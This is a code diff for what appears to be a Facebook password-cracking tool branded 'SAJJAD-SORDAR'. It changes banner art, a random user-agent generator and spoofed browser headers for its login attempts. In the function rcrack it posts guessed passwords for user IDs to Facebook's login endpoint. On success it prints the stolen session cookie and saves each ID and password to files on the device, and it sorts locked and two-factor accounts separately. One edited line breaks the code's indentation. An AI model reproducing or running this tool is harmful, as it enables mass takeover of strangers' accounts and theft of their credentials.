@@ -91,7 +91,7 @@ done = False
 
 ugen=[]
 ugen5=[]
-for xd in range(10000):
+for xd in range(1000):
     a='Mozilla/5.0 (Symbian/3; Series60/5.2'
     b=random.randrange(1, 9)
     c=random.randrange(1, 9)
@@ -161,34 +161,39 @@ class jihad:
 os.system('xdg-open https://www.facebook.com/profile.php?id=100088316394289');time.sleep(1)
 logo =("""  
 \033[0;33m 
-   _____             _      _         _____  
-  / ____|  /\       | |    | |  /\   |  __ \ 
- | (___   /  \      | |    | | /  \  | |  | |
-  \___ \ / /\ \ _   | |_   | |/ /\ \ | |  | |
-  ____) / ____ \ |__| | |__| / ____ \| |__| |
- |_____/_/____\_\____/ \____/_/    \_\_____/ 
-  / ____|/ __ \|  __ \|  __ \   /\   |  __ \ 
- | (___ | |  | | |__) | |  | | /  \  | |__) |
-  \___ \| |  | |  _  /| |  | |/ /\ \ |  _  / 
-  ____) | |__| | | \ \| |__| / ____ \| | \ \ 
- |_____/ \____/|_|  \_\_____/_/   \_\_|  \_\ 
-                                                                                                            
-
-\x1b[38;2;207m┏━\x1b[38;2;207m━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━\x1b[38;2;207m━┓
-\x1b[38;2;207m┃\033[1;92m_ _\033[1;93m _ _ \033[1;95m_ _\x1b[38;5;208m _ \033[1;91m___ \033[1;97m\x1b[38;2;207m┃\x1b[38;5;208m𝗦𝗔𝗝𝗝𝗔𝗗-𝗦𝗢𝗥𝗗𝗔𝗥\033[1;0m\x1b[38;2;207m┃
-\x1b[38;2;207m┃\033[1;92m|\/|\033[1;93m | |\033[1;95m |__|\x1b[38;5;208m |\033[1;91m |__]\033[1;97m\x1b[38;2;207m┣━━━━━━━━━━━━━━━━━━\x1b[38;2;207m━┫
-\x1b[38;2;207m┃\033[1;92m| |\033[1;93m |__| \033[1;95m| | \x1b[38;5;208m|\033[1;91m |__]\033[1;97m\x1b[38;2;207m┃\x1b[38;7;207m\033[1;42m𝐒𝐒𝐓 - 𝐕𝐄𝐑𝐒𝐈𝐎𝐍- 𝟐.𝟏\033[1;0m\x1b[38;2;207m┃
-\x1b[38;2;207m┃\033[1;97m \x1b[38;2;207m ┃\033[1;96m 𝐁𝐀𝐍𝐆𝐋𝐀𝐃𝐄𝐒𝐇-𝐑𝐀𝐍𝐃𝐎𝐌 \033[1;97m\x1b[38;2;207m┃
-\x1b[38;2;207m┣━\x1b[38;2;207m━━━━━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━\x1b[38;2;207m━┫""")
-logo= (""" 
-\x1b[38;2;207m┏━\x1b[38;2;207m━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━\x1b[38;2;207m━┓
-\x1b[38;2;207m┃\033[1;92m_ _\033[1;93m _ _ \033[1;95m_ _\x1b[38;5;208m _ \033[1;91m___ \033[1;97m\x1b[38;2;207m┃\x1b[38;5;208m𝗦𝗔𝗝𝗝𝗔𝗗-𝗦𝗢𝗥𝗗𝗔𝗥\033[1;0m\x1b[38;2;207m┃
-\x1b[38;2;207m┃\033[1;92m|\/|\033[1;93m | |\033[1;95m |__|\x1b[38;5;208m |\033[1;91m |__]\033[1;97m\x1b[38;2;207m┣━━━━━━━━━━━━━━━━━━\x1b[38;2;207m━┫
-\x1b[38;2;207m┃\033[1;92m| |\033[1;93m |__| \033[1;95m| | \x1b[38;5;208m|\033[1;91m |__]\033[1;97m\x1b[38;2;207m┃\x1b[38;7;207m\033[1;42m𝐒𝐒𝐓 - 𝐕𝐄𝐑𝐒𝐈𝐎𝐍- 𝟐.𝟏\033[1;0m\x1b[38;2;207m┃
-\x1b[38;2;207m┃\033[1;97m \x1b[38;2;207m ┃\033[1;96m 𝐁𝐀𝐍𝐆𝐋𝐀𝐃𝐄𝐒𝐇-𝐑𝐀𝐍𝐃𝐎𝐌 \033[1;97m\x1b[38;2;207m┃
-\x1b[38;2;207m┗━\x1b[38;2;207m━━━━━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━\x1b[38;2;207m━┛""")
-
- 
+        
+                                                                                                                                        
+                                                                                                                                        
+   SSSSSSSSSSSSSSS              AAA                      JJJJJJJJJJJ        JJJJJJJJJJJ          AAA               DDDDDDDDDDDDD        
+ SS:::::::::::::::S            A:::A                     J:::::::::J        J:::::::::J         A:::A              D::::::::::::DDD     
+S:::::SSSSSS::::::S           A:::::A                    J:::::::::J        J:::::::::J        A:::::A             D:::::::::::::::DD   
+S:::::S     SSSSSSS          A:::::::A                   JJ:::::::JJ        JJ:::::::JJ       A:::::::A            DDD:::::DDDDD:::::D  
+S:::::S                     A:::::::::A                    J:::::J            J:::::J        A:::::::::A             D:::::D    D:::::D 
+S:::::S                    A:::::A:::::A                   J:::::J            J:::::J       A:::::A:::::A            D:::::D     D:::::D
+ S::::SSSS                A:::::A A:::::A                  J:::::J            J:::::J      A:::::A A:::::A           D:::::D     D:::::D
+  SS::::::SSSSS          A:::::A   A:::::A                 J:::::j            J:::::j     A:::::A   A:::::A          D:::::D     D:::::D
+    SSS::::::::SS       A:::::A     A:::::A                J:::::J            J:::::J    A:::::A     A:::::A         D:::::D     D:::::D
+       SSSSSS::::S     A:::::AAAAAAAAA:::::A   JJJJJJJ     J:::::JJJJJJJJ     J:::::J   A:::::AAAAAAAAA:::::A        D:::::D     D:::::D
+            S:::::S   A:::::::::::::::::::::A  J:::::J     J:::::JJ:::::J     J:::::J  A:::::::::::::::::::::A       D:::::D     D:::::D
+            S:::::S  A:::::AAAAAAAAAAAAA:::::A J::::::J   J::::::JJ::::::J   J::::::J A:::::AAAAAAAAAAAAA:::::A      D:::::D    D:::::D 
+SSSSSSS     S:::::S A:::::A             A:::::AJ:::::::JJJ:::::::JJ:::::::JJJ:::::::JA:::::A             A:::::A   DDD:::::DDDDD:::::D  
+S::::::SSSSSS:::::SA:::::A               A:::::AJJ:::::::::::::JJ  JJ:::::::::::::JJA:::::A               A:::::A  D:::::::::::::::DD   
+S:::::::::::::::SSA:::::A                 A:::::A JJ:::::::::JJ      JJ:::::::::JJ A:::::A                 A:::::A D::::::::::::DDD     
+ SSSSSSSSSSSSSSS AAAAAAA                   AAAAAAA  JJJJJJJJJ          JJJJJJJJJ  AAAAAAA                   AAAAAAADDDDDDDDDDDDD        
+                                                                                                                                        
+                                                                                                                                        
+                                                                                                                                        
+                                                                                                                                        
+                                                                                                                                        
+                                                                                                                                        
+                                                                                                                                        
+                            
+\033[1;37m------------------------------------------------
+\033[1;37m Owner   :           -
+\033[1;37m Facebook:         
+\033[1;37m Github  :            
+\033[1;37m Version :           . 
+\033[1;37m------------------------------------------------ ''''''
  
 def cek_apk(session,coki):
     w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
@@ -286,25 +291,27 @@ def rcrack(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority': 'm.facebook.com',
-    'method':'GET',
-    'scheme':'https',
+            header_freefb = {    'authority': 'mbasic.facebook.com',
+    'method': 'GET', 
+    'path': '/', 
+    'scheme': 'https', 
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+    'accept-language': 'en-US,en;q=0.9',
     'cache-control': 'max-age=0',
-    'referer': 'https://m.facebook.com/',
-    'sec-ch-prefers-color-scheme': 'light',
+    'dpr': '2.75',
+    'sec-ch-prefers-color-scheme': 'dark',
     'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
-    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.27"',
+    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.61"',
     'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-model': '"21091116UI"',
     'sec-ch-ua-platform': '"Android"',
     'sec-ch-ua-platform-version': '"13.0.0"',
     'sec-fetch-dest': 'document',
     'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'same-origin',
+    'sec-fetch-site': 'none',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent': pro,}
+    'user-agent': pro,} 
             twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
             lo = session.post('https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
@@ -313,15 +320,11 @@ def rcrack(uid,pwx,tl):
                 cid = coki[7:22]
                 print('\033[1;34m[\033[\033[0;101mSAJJAD -🥵\033[0m[\033[1;32mOK\033[1;34m]\033[1;32m'+uid+'\033[1;32m • \033[1;32m'+ps+'')
                 print('\r\033[0;101mCOOKIE \033[0m=''\033[1;32m'+coki+'\033[0m''\033[0m')
-               # cek_apk(session,coki)
+               
                 open('/sdcard/SAJJAD -🥵-OK💚.txt', 'a').write( uid+' | '+ps+'\n')
                 oks.append(cid);cek_apk(coki)
                 break
-          #  elif 'checkpoint' in log_cookies:
-              #  coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-          #      cid = coki[24:39]
-               #print('\r\r\33[1;34m SAJJAD -CP'( uid+' | '+ps+' \n')
-                open('/sdcard/SAJJAD -cp💔.txt', 'a').write( uid+' | '+ps+' \n')
+                   open('/sdcard/SAJJAD -cp💔.txt', 'a').write( uid+' | '+ps+' \n')
                # cps.append(cid)
             elif twf in session.cookies.get_dict().keys():
                 print('\033[1;93m\033[0;34mSAJJAD -🥵-2F '+uid+' • '+ps+'  \033[0;97m')
